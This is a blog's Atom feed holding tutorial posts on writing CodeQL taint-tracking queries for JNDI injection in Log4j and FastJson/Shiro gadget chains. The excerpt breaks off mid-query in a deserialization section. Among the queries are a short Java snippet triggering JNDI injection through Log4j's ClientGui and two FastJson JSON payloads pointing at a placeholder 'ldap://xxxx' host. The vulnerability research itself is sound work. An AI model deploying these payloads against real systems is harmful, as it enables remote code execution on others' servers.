<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.sari3l.com/"/>
  <updated>2021-12-30T07:00:59.201Z</updated>
  <id>https://blog.sari3l.com/</id>
  
  <author>
    <name>Sariel.D</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CodeQL 学习小记 Log4j</title>
    <link href="https://blog.sari3l.com/posts/b6c4d907/"/>
    <id>https://blog.sari3l.com/posts/b6c4d907/</id>
    <published>2021-12-30T06:32:20.000Z</published>
    <updated>2021-12-30T07:00:59.201Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p></blockquote><h2 id="QL"><a href="#QL" class="headerlink" title="QL"></a>QL</h2><p>这里可以借鉴 CWE-074 中的内容，直接使用其定义的 sink，其已经将常见的利用点标记出来</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">DefaultJndiInjectionSinkModel</span> <span class="token keyword">extends</span> <span class="token class-name">SinkModelCsv</span> <span class="token punctuation">{</span>  override predicate <span class="token function">row</span><span class="token punctuation">(</span>string row<span class="token punctuation">)</span> <span class="token punctuation">{</span>    row <span class="token operator">=</span>      <span class="token punctuation">[</span>        <span class="token string">"javax.naming;Context;true;lookup;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.naming;Context;true;lookupLink;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.naming;Context;true;rename;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.naming;Context;true;list;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.naming;Context;true;listBindings;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.naming;InitialContext;true;doLookup;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.management.remote;JMXConnector;true;connect;;;Argument[-1];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.management.remote;JMXConnectorFactory;false;connect;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// Spring</span>        <span class="token string">"org.springframework.jndi;JndiTemplate;false;lookup;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// spring-ldap 1.2.x and newer</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;lookup;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;lookupContext;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;findByDn;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;rename;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;list;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;listBindings;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;search;(Name,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;search;(Name,String,int,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;search;(Name,String,int,String[],ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;search;(String,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;search;(String,String,int,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;search;(String,String,int,String[],ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;searchForObject;(Name,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;searchForObject;(String,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// spring-ldap 1.1.x</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;lookup;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;lookupContext;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;findByDn;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;rename;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;list;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;listBindings;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;search;(Name,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;search;(Name,String,int,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;search;(Name,String,int,String[],ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;search;(String,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;search;(String,String,int,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;search;(String,String,int,String[],ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;searchForObject;(Name,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;searchForObject;(String,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// Shiro</span>        <span class="token string">"org.apache.shiro.jndi;JndiTemplate;false;lookup;;;Argument[0];jndi-injection"</span>      <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>所以我们只要关注到 source 的定义即可，而追溯 source 不管怎么向上，终归应该是有个函数中的某个参数是源头，所以如下定义 source</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * @kind path-problem */</span><span class="token keyword">import</span> java<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>JndiInjection<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>FlowSources<span class="token keyword">import</span> DataFlow<span class="token operator">:</span><span class="token operator">:</span>PathGraph<span class="token keyword">class</span> <span class="token class-name">Config</span> <span class="token keyword">extends</span> <span class="token class-name">TaintTracking</span><span class="token operator">:</span><span class="token operator">:</span>Configuration <span class="token punctuation">{</span>    <span class="token function">Config</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span> <span class="token operator">=</span> <span class="token string">"Config"</span> <span class="token punctuation">}</span>    override predicate <span class="token function">isSource</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node source<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exists</span><span class="token punctuation">(</span>Argument a <span class="token operator">|</span> a <span class="token operator">=</span> source<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    override predicate <span class="token function">isSink</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node sink<span class="token punctuation">)</span> <span class="token punctuation">{</span> sink <span class="token keyword">instanceof</span> <span class="token class-name">JndiInjectionSink</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>from DataFlow<span class="token operator">:</span><span class="token operator">:</span>PathNode source<span class="token punctuation">,</span> DataFlow<span class="token operator">:</span><span class="token operator">:</span>PathNode sink<span class="token punctuation">,</span> Config confwhere conf<span class="token punctuation">.</span><span class="token function">hasFlowPath</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>select sink<span class="token punctuation">.</span><span class="token function">getNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"JNDI lookup might include name from $@."</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span><span class="token function">getNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"this user input"</span></code></pre><p>这个结果太多以至于就不放上来占篇幅了，不过有很多有意思的东西可以自己看看</p><h2 id="限定-AbstractLogger"><a href="#限定-AbstractLogger" class="headerlink" title="限定 AbstractLogger"></a>限定 AbstractLogger</h2><p>限定为AbstractLogger的主要考虑是为了重现 CVE-2021-44228，由于此类下方法太多，没必要过于细化，我们只要考虑这个类里，某个公开函数的某个参数应是 source 即可</p><pre class=" language-java"><code class="language-java">override predicate <span class="token function">isSource</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node source<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exists</span><span class="token punctuation">(</span>MethodAccess mda <span class="token operator">|</span>        mda<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.spi"</span><span class="token punctuation">,</span> <span class="token string">"AbstractLogger"</span><span class="token punctuation">)</span> and        mda<span class="token punctuation">.</span><span class="token function">getAnArgument</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> source<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and        mda<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>基本有的没的就全出来了</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/b6c4d907/16408456562983.jpg" alt></p><h2 id="关于-DataSourceConnectionSource"><a href="#关于-DataSourceConnectionSource" class="headerlink" title="关于 DataSourceConnectionSource"></a>关于 DataSourceConnectionSource</h2><p>这个发现不用什么高大上的方法，甚至根本不该称为漏洞（很模糊的界限），注释里面写的就是对 JNDI 形式的支持（我觉得官方现在是草木皆兵</p><p>只需要对上述的 isSink 使用<code>CodeQL: Quick Evaluation</code>快速查询即可</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/b6c4d907/16408446083777.jpg" alt></p><p>如果上面的都能称为漏洞，那么如<code>org.apache.logging.log4j.jmx.gui.ClientGui#main</code>里也明显有 JNDI 注入，只是需要传输指定类名为 jmxrmi</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/b6c4d907/16408446887099.jpg" alt></p><p>直接利用</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>jmx<span class="token punctuation">.</span>gui<span class="token punctuation">.</span>ClientGui<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        System<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.rmi.object.trustURLCodebase"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ClientGui<span class="token punctuation">.</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><br><br><p align="center">终归就是  <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/b6c4d907/no-no-please.gif" width="30%" height="30%"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;再水一篇 CodeQL&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="CodeQL" scheme="https://blog.sari3l.com/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 学习小记</title>
    <link href="https://blog.sari3l.com/posts/91764dea/"/>
    <id>https://blog.sari3l.com/posts/91764dea/</id>
    <published>2021-12-27T13:23:51.000Z</published>
    <updated>2021-12-30T07:01:03.558Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p></blockquote><h2 id="FastJson-JNDI-分析"><a href="#FastJson-JNDI-分析" class="headerlink" title="FastJson JNDI 分析"></a>FastJson JNDI 分析</h2><h3 id="方向"><a href="#方向" class="headerlink" title="方向"></a>方向</h3><p>首先，我们先要明确现在是已知漏洞点和步入条件，由此来尝试获取其他未知的链</p><pre class=" language-plain"><code class="language-plain">比如需要满足以下条件的setter- 函数名长度 >= 4- 非静态函数- 返回类型要么是void要么是当前类- 参数只有一个- 方法名需要以set开头----满足以下条件的getter- 函数名长度 >= 4- 非静态函数- 函数名称以get起始，且第四个字符为大写字母- 函数没有入参- 继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</code></pre><p>首先编译好数据库，然后开始着手 QL 查询文件</p><h3 id="QL"><a href="#QL" class="headerlink" title="QL"></a>QL</h3><h4 id="I-定义-JNDI-相关方法"><a href="#I-定义-JNDI-相关方法" class="headerlink" title="I. 定义 JNDI 相关方法"></a>I. 定义 JNDI 相关方法</h4><p>第一步，由于我们目标 sink 是 JNDI 相关类下的 lookup 方法，所以先定义目标方法</p><pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">JNDIMethod</span> <span class="token keyword">extends</span> <span class="token class-name">Method</span> <span class="token punctuation">{</span>    <span class="token function">JNDIMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span> and        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hasName</span><span class="token punctuation">(</span><span class="token string">"lookup"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>来解释下各行的内容，之后的学习就不再赘述</p><ul><li>Line 1: 首先自定义的类要继承 Codeql 提供的 <a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Member.qll/type.Member$Method.html" target="_blank" rel="noopener">Method 类</a>，用于遴选出我们想要的方法</li><li>Line 3、4: 这两行的作用即满足这些<code>限制条件</code>，那么<code>this</code>应是我们想要的方法</li></ul><p>其中，对限制条件中用到的函数做一些解释</p><ul><li>Member::getDeclaringType -&gt; RefType 获取定义当前方法的类</li><li>RefType::getAnAncestor -&gt; RefType 获取当前类的直接或间接父类，包括其自身</li><li>Member::hasQualifiedName -&gt; predicate 判断此类是否在指定 package 中以指定 name 声明</li></ul><p>所以整个限制条件直接翻译就是：寻找名为 lookup 的方法所在类，且此类应在javax.naming中被声明为Context类，即查找 <code>javax.naming.Context#lookup</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">JNDIMethod</span> <span class="token keyword">extends</span> <span class="token class-name">Method</span> <span class="token punctuation">{</span>    <span class="token function">JNDIMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span> and        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hasName</span><span class="token punctuation">(</span><span class="token string">"lookup"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="II-设定-全局-污点跟踪"><a href="#II-设定-全局-污点跟踪" class="headerlink" title="II. 设定(全局)污点跟踪"></a>II. 设定(全局)污点跟踪</h3><h4 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h4><p>函数解释</p><ul><li>FieldAccesses::getSite -&gt; Callable 获取当前字段所在表达式的直接封闭可调用对象（细品</li><li>Element::getName -&gt; string 获取当前元素的命名</li></ul><p>isSource 检测是否存在某个对字段的访问的表达式，是在名为 getXXX 或 setXXX 的函数中，是的话则将此<code>字段入口</code>设置为搜寻的 source（起点）</p><pre class=" language-java"><code class="language-java">override predicate <span class="token function">isSource</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exists</span><span class="token punctuation">(</span>FieldAccess fac <span class="token operator">|</span> <span class="token punctuation">(</span>            fac<span class="token punctuation">.</span><span class="token function">getSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span> or            fac<span class="token punctuation">.</span><span class="token function">getSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>        <span class="token punctuation">)</span> and node<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> fac    <span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h4 id="Sink"><a href="#Sink" class="headerlink" title="Sink"></a>Sink</h4><p>函数解释</p><ul><li>MethodAccess::getMethod -&gt; Method 返回当前方法入口的方法（绕口 </li></ul><p>isSink 检测是否存在某个方法是 JNDIMethod 的实例，且第一个参数可控，是的话将此<code>方法入口</code>设置为搜寻的 sink（终点）</p><pre class=" language-java"><code class="language-java">override predicate <span class="token function">isSink</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exists</span><span class="token punctuation">(</span>MethodAccess md <span class="token operator">|</span> <span class="token punctuation">(</span>            md<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">JNDIMethod</span> and            node<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> md<span class="token punctuation">.</span><span class="token function">getArgument</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h3 id="III-执行搜索"><a href="#III-执行搜索" class="headerlink" title="III. 执行搜索"></a>III. 执行搜索</h3><p>说实话看官方文档没太看懂 DataFlow DataFlow2 有啥区别</p><ul><li>Configuration::hasFlowPath -&gt; predicate 获取满足从 source 流向 sink 的数据</li></ul><pre class=" language-java"><code class="language-java">from MyTaintTraking conf<span class="token punctuation">,</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathNode source<span class="token punctuation">,</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathNode sinkwhere conf<span class="token punctuation">.</span><span class="token function">hasFlowPath</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>select <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h4 id="Metadata-设置"><a href="#Metadata-设置" class="headerlink" title="Metadata 设置"></a>Metadata 设置</h4><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * @kind path-problem */</span><span class="token keyword">import</span> java<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>FlowSources<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>TaintTracking2<span class="token keyword">import</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathGraph<span class="token keyword">class</span> <span class="token class-name">JNDIMethod</span> <span class="token keyword">extends</span> <span class="token class-name">Method</span> <span class="token punctuation">{</span>    <span class="token function">JNDIMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span> and        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hasName</span><span class="token punctuation">(</span><span class="token string">"lookup"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">MyTaintTraking</span> <span class="token keyword">extends</span> <span class="token class-name">TaintTracking2</span><span class="token operator">:</span><span class="token operator">:</span>Configuration <span class="token punctuation">{</span>    <span class="token function">MyTaintTraking</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span> <span class="token operator">=</span> <span class="token string">"MyTaintTraking"</span> <span class="token punctuation">}</span>    override predicate <span class="token function">isSource</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exists</span><span class="token punctuation">(</span>FieldAccess fac <span class="token operator">|</span> <span class="token punctuation">(</span>                fac<span class="token punctuation">.</span><span class="token function">getSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span> or                fac<span class="token punctuation">.</span><span class="token function">getSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>            <span class="token punctuation">)</span> and node<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> fac        <span class="token punctuation">)</span>    <span class="token punctuation">}</span>    override predicate <span class="token function">isSink</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exists</span><span class="token punctuation">(</span>MethodAccess md <span class="token operator">|</span> <span class="token punctuation">(</span>                md<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">JNDIMethod</span> and                node<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> md<span class="token punctuation">.</span><span class="token function">getArgument</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span>        <span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>from MyTaintTraking conf<span class="token punctuation">,</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathNode source<span class="token punctuation">,</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathNode sinkwhere conf<span class="token punctuation">.</span><span class="token function">hasFlowPath</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>select sink<span class="token punctuation">.</span><span class="token function">getNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"JNDI lookup might include name from $@."</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span><span class="token function">getNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"this user input"</span></code></pre><h3 id="IV-分析结果"><a href="#IV-分析结果" class="headerlink" title="IV. 分析结果"></a>IV. 分析结果</h3><p>最后成功执行会有 alerts 信息，本次有三条，但实际是两条链，中间因为有<code>if...else...</code>结构导致 Path 看起来多，结果中的 Path 从上到下即是从 source 到 sink 的过程</p><h4 id="JndiObjectFactory"><a href="#JndiObjectFactory" class="headerlink" title="JndiObjectFactory"></a>JndiObjectFactory</h4><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91764dea/16403289987343.jpg" alt></p><p>对应 Payload</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.shiro.jndi.JndiObjectFactory"</span><span class="token punctuation">,</span>    <span class="token property">"resourceName"</span><span class="token operator">:</span> <span class="token string">"ldap://xxxx"</span><span class="token punctuation">}</span></code></pre><h4 id="JndiRealmFactory"><a href="#JndiRealmFactory" class="headerlink" title="JndiRealmFactory"></a>JndiRealmFactory</h4><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91764dea/16403290786878.jpg" alt></p><p>对应 Payload</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.shiro.realm.jndi.JndiRealmFactory"</span><span class="token punctuation">,</span>    <span class="token property">"jndiNames"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"ldap://xxxx"</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h2 id="Shiro-Deserialize-分析"><a href="#Shiro-Deserialize-分析" class="headerlink" title="Shiro Deserialize 分析"></a>Shiro Deserialize 分析</h2><p>我们知道序列化的终点是<code>java.io.ObjectInputStream#readObject</code>即可以作为 sink，那么关键点在于如何设定 source</p><h3 id="QL-1"><a href="#QL-1" class="headerlink" title="QL"></a>QL</h3><p>首先我们确定肯定是从某个字段最终流向反序列化执行，所以这里 source 设置为所有字段</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * @kind path-problem */</span><span class="token keyword">import</span> java<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>TaintTracking2<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>FlowSources<span class="token keyword">import</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathGraph<span class="token keyword">class</span> <span class="token class-name">DeseializationMethod</span> <span class="token keyword">extends</span> <span class="token class-name">Method</span> <span class="token punctuation">{</span>    <span class="token function">DeseializationMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token 